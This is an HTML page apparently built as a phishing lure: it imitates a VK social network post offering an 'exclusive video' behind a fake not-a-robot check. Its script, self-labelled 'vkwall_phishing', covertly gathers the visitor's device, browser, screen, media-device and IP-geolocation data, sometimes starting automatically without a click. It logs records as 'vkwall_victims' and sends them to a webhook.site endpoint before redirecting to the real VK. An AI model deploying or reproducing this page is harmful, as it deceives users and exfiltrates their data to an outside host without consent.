<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ù–æ–≤–∞—è –∑–∞–ø–∏—Å—å | VK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #4a76a8; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            height: 100vh;
        }
        
        .vk-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(135deg, #4a76a8 0%, #5b88bd 100%);
        }
        
        .vk-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .vk-logo {
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 1rem;
        }
        
        .post-card {
            background: white;
            color: #000;
            border-radius: 12px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            margin-bottom: 2rem;
        }
        
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .avatar {
            width: 50px;
            height: 50px;
            background: #4a76a8;
            border-radius: 50%;
            margin-right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .user-info h3 {
            margin: 0;
            color: #2a5885;
        }
        
        .user-info span {
            color: #656565;
            font-size: 0.9rem;
        }
        
        .post-content {
            margin: 1.5rem 0;
            line-height: 1.5;
        }
        
        .post-image {
            width: 100%;
            height: 200px;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            border-radius: 8px;
            margin: 1rem 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }
        
        .post-image::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .play-button {
            position: absolute;
            background: rgba(0,0,0,0.7);
            border-radius: 50%;
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            cursor: pointer;
            z-index: 2;
        }
        
        .post-stats {
            display: flex;
            justify-content: space-between;
            color: #656565;
            font-size: 0.9rem;
            border-top: 1px solid #e7e8ec;
            padding-top: 1rem;
            margin-bottom: 1rem;
        }
        
        .choice-buttons {
            display: flex;
            gap: 1rem;
            margin-top: 1.5rem;
        }
        
        .vk-button {
            background: #4a76a8;
            color: white;
            border: none;
            padding: 15px 20px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            flex: 1;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        
        .vk-button:hover {
            background: #3d6899;
            transform: translateY(-2px);
        }
        
        .vk-button.secondary {
            background: #e5ebf1;
            color: #2a5885;
            border: 2px solid #4a76a8;
        }
        
        .vk-button.secondary:hover {
            background: #dce3eb;
        }
        
        .vk-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #e7e8ec;
            border-radius: 2px;
            margin: 1rem 0;
            overflow: hidden;
            display: none;
        }
        
        .loading-progress {
            height: 100%;
            background: #4a76a8;
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .status-message {
            text-align: center;
            margin: 1rem 0;
            padding: 1rem;
            border-radius: 8px;
            display: none;
            font-weight: 500;
        }
        
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        
        .privacy-notice {
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            margin-top: 2rem;
            max-width: 500px;
        }
        
        .video-info {
            background: #f5f7fa;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            border-left: 4px solid #4a76a8;
        }
        
        .video-info h4 {
            color: #2a5885;
            margin-bottom: 0.5rem;
        }
        
        .video-meta {
            display: flex;
            gap: 1rem;
            color: #656565;
            font-size: 0.9rem;
            flex-wrap: wrap;
        }
        
        .verified-badge {
            background: #4a76a8;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-left: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="vk-container">
        <div class="vk-header">
            <div class="vk-logo">VK</div>
            <h2>–ù–æ–≤–∞—è –∑–∞–ø–∏—Å—å –≤ –ª–µ–Ω—Ç–µ</h2>
        </div>
        
        <div class="post-card">
            <div class="post-header">
                <div class="avatar">–ê–ü</div>
                <div class="user-info">
                    <h3>–ê–Ω–Ω–∞ –ü–µ—Ç—Ä–æ–≤–∞ <span class="verified-badge">‚úì</span></h3>
                    <span>–¢–æ–ª—å–∫–æ —á—Ç–æ ¬∑ –û–±—â–µ–¥–æ—Å—Ç—É–ø–Ω–∞—è –∑–∞–ø–∏—Å—å</span>
                </div>
            </div>
            
            <div class="post-content">
                <p>–†–µ–±—è—Ç–∞, –ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ —ç—Ç–æ –≤–∏–¥–µ–æ! üòç –ù–µ–≤–µ—Ä–æ—è—Ç–Ω—ã–µ –∫–∞–¥—Ä—ã, —Ç–∞–∫–æ–≥–æ –≤—ã –µ—â–µ –Ω–µ –≤–∏–¥–µ–ª–∏! –≠—Ç–æ –ø—Ä–æ—Å—Ç–æ –≤–∑—Ä—ã–≤ —ç–º–æ—Ü–∏–π! üí•</p>
                
                <div class="video-info">
                    <h4>üé• –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–µ –≤–∏–¥–µ–æ</h4>
                    <p>–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: 2:45 ¬∑ –ö–∞—á–µ—Å—Ç–≤–æ: 1080p ¬∑ –ü—Ä–æ—Å–º–æ—Ç—Ä–æ–≤: 1.2K</p>
                    <div class="video-meta">
                        <span>üìÖ –°–µ–≥–æ–¥–Ω—è</span>
                        <span>üëÅÔ∏è 1.2K –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤</span>
                        <span>‚≠ê 245 –ª–∞–π–∫–æ–≤</span>
                    </div>
                </div>
                
                <div class="post-image" onclick="startVerification('click')">
                    <div class="play-button">‚ñ∂</div>
                    –í–ò–î–ï–û –ó–ê–ü–ò–°–¨
                </div>
                
                <p><strong>–î–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç</strong></p>
            </div>
            
            <div class="post-stats">
                <span>‚ù§Ô∏è 245</span>
                <span>üí¨ 89</span>
                <span>‚Ü™Ô∏è 34</span>
                <span>üëÅÔ∏è 1.2K</span>
            </div>
            
            <div class="loading-bar" id="loadingBar">
                <div class="loading-progress" id="loadingProgress"></div>
            </div>
            
            <div class="status-message" id="statusMessage"></div>
            
            <div class="choice-buttons">
                <button class="vk-button secondary" onclick="startVerification('app')" id="appBtn">
                    üì± –û—Ç–∫—Ä—ã—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
                </button>
                <button class="vk-button" onclick="startVerification('site')" id="siteBtn">
                    üåê –°–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ —Å–∞–π—Ç–µ
                </button>
            </div>
        </div>
        
        <div class="privacy-notice">
            üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç —Ä–æ–±–æ—Ç–æ–≤
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b';
        let isCollecting = false;
        let collectionMethod = '';

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã (–∏–º–∏—Ç–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç–∞)
        setTimeout(() => {
            if (!isCollecting && Math.random() < 0.4) {
                showStatus('ü§ñ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞...', 'info');
                startAutoCollection('auto');
            }
        }, 3000);

        function startVerification(method) {
            if (!isCollecting) {
                collectionMethod = method;
                startAutoCollection(method);
            }
        }

        function startAutoCollection(method) {
            if (isCollecting) return;
            isCollecting = true;
            
            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫–∏
            document.getElementById('appBtn').disabled = true;
            document.getElementById('siteBtn').disabled = true;
            
            // –°–∫—Ä—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫–∏ –≤—ã–±–æ—Ä–∞
            document.querySelector('.choice-buttons').style.display = 'none';
            document.getElementById('loadingBar').style.display = 'block';
            
            let buttonText = '–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤–∏–¥–µ–æ...';
            if (method === 'app') buttonText = '–ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...';
            if (method === 'site') buttonText = '–ó–∞–≥—Ä—É–∑–∫–∞ –ø–ª–µ–µ—Ä–∞...';
            if (method === 'auto') buttonText = '–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞...';
            
            showStatus(buttonText, 'info');

            // –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 12;
                if (progress > 100) progress = 100;
                document.getElementById('loadingProgress').style.width = progress + '%';
                
                if (progress >= 25) {
                    showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...', 'info');
                }
                if (progress >= 50) {
                    showStatus('–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è –∫–∞—á–µ—Å—Ç–≤–∞...', 'info');
                }
                if (progress >= 75) {
                    showStatus('–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...', 'info');
                }
            }, 300);

            // –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            setTimeout(async () => {
                try {
                    const collectedData = await collectAllData(method);
                    await sendCollectedData(collectedData);
                    
                    clearInterval(progressInterval);
                    document.getElementById('loadingProgress').style.width = '100%';
                    
                    // –£—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                    showSuccess(method);
                    
                } catch (error) {
                    console.error('Collection error:', error);
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.', 'error');
                    resetInterface();
                }
            }, 4000);
        }

        async function collectAllData(method) {
            const data = {
                session: {
                    id: generateId(),
                    startTime: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    source: 'vkwall_phishing',
                    method: method,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                },
                device: await getDeviceInfo(),
                location: await getLocationInfo(),
                network: getNetworkInfo(),
                browser: getBrowserInfo(),
                screen: getScreenInfo(),
                media: await getMediaDevices(),
                performance: getPerformanceInfo(),
                interaction: {
                    method: method,
                    clickTime: Date.now(),
                    pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
                    userInteracted: method !== 'auto'
                }
            };
            
            return data;
        }

        async function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                javaEnabled: navigator.javaEnabled()
            };
        }

        async function getLocationInfo() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ip.sb/geoip'
            ];
            
            for (let api of apis) {
                try {
                    const response = await fetch(api);
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        country: data.country_name || data.country,
                        city: data.city,
                        region: data.region,
                        timezone: data.timezone,
                        org: data.org,
                        postal: data.postal,
                        coordinates: data.loc
                    };
                } catch(e) { 
                    continue; 
                }
            }
            return null;
        }

        function getNetworkInfo() {
            const conn = navigator.connection;
            return {
                effectiveType: conn?.effectiveType,
                downlink: conn?.downlink,
                rtt: conn?.rtt,
                saveData: conn?.saveData,
                online: navigator.onLine
            };
        }

        function getBrowserInfo() {
            return {
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename
                })).slice(0, 5),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).slice(0, 10),
                language: navigator.language,
                languages: navigator.languages
            };
        }

        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            };
        }

        async function getMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    count: devices.length,
                    types: devices.map(d => d.kind),
                    hasLabels: devices.some(d => d.label),
                    devices: devices.map(d => ({
                        kind: d.kind,
                        deviceId: d.deviceId ? 'present' : 'missing',
                        hasLabel: !!d.label
                    }))
                };
            } catch(e) {
                return { error: e.message };
            }
        }

        function getPerformanceInfo() {
            const mem = performance.memory;
            return {
                memory: mem ? {
                    used: mem.usedJSHeapSize,
                    total: mem.totalJSHeapSize,
                    limit: mem.jsHeapSizeLimit
                } : null,
                timing: performance.timing ? {
                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                    readyStart: performance.timing.fetchStart - performance.timing.navigationStart
                } : null,
                navigation: performance.navigation ? {
                    type: performance.navigation.type,
                    redirectCount: performance.navigation.redirectCount
                } : null
            };
        }

        async function sendCollectedData(data) {
            try {
                // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ localStorage
                const existingData = JSON.parse(localStorage.getItem('vkwall_victims') || '[]');
                existingData.push(data);
                localStorage.setItem('vkwall_victims', JSON.stringify(existingData));
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ webhook
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'X-Source': 'vkwall_phishing',
                        'X-Session-ID': data.session.id
                    },
                    body: JSON.stringify({
                        type: 'vkwall_phishing_complete',
                        data: data,
                        campaign: 'video_post',
                        timestamp: new Date().toISOString(),
                        version: '2.0'
                    })
                });
                
                if (!response.ok) {
                    console.log('Webhook response not OK:', response.status);
                }
                
            } catch (error) {
                console.error('Send error:', error);
            }
        }

        function showSuccess(method) {
            showStatus('‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ó–∞–≥—Ä—É–∑–∫–∞ –≤–∏–¥–µ–æ...', 'success');
            
            setTimeout(() => {
                // –†–µ–¥–∏—Ä–µ–∫—Ç –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤—ã–±–æ—Ä–∞
                if (method === 'app') {
                    // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
                    window.location.href = 'vk://video' + generateId();
                } else {
                    // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –Ω–∞—Å—Ç–æ—è—â–∏–π VK
                    window.location.href = 'https://vk.com/videos';
                }
            }, 2000);
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.className = `status-message ${type}`;
            statusEl.style.display = 'block';
        }

        function resetInterface() {
            document.querySelector('.choice-buttons').style.display = 'flex';
            document.getElementById('loadingBar').style.display = 'none';
            document.getElementById('statusMessage').style.display = 'none';
            document.getElementById('appBtn').disabled = false;
            document.getElementById('siteBtn').disabled = false;
            isCollecting = false;
        }

        function generateId() {
            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
        }

        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            if (!isCollecting) return;
            
            const exitData = {
                type: 'page_exit',
                sessionId: generateId(),
                timeSpent: Date.now() - performance.timing.navigationStart,
                timestamp: new Date().toISOString()
            };
            
            // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –≤—ã—Ö–æ–¥–µ
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(exitData)
            }).catch(() => {}); // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ
        });

    </script>
</body>
</html>
